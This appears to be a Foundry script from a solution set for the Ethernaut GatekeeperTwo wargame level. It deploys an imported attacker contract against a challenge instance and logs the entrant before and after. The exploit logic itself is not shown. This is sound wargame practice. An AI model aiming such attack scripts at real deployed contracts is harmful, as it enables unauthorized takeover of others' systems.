// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/14_GatekeeperTwo.sol";
import "contracts/14_GatekeeperTwo.sol";

contract AttackerGatekeeperTwoScript is Script {
    GatekeeperTwo gatekeeperTwo = GatekeeperTwo(vm.envAddress("INSTANCE"));

    function run() external {
        vm.startBroadcast();

        console.log("Current entrant :", gatekeeperTwo.entrant());
        new AttackerGatekeeperTwo(address(gatekeeperTwo));
        console.log("New entrant :", gatekeeperTwo.entrant());

        vm.stopBroadcast();
    }
}
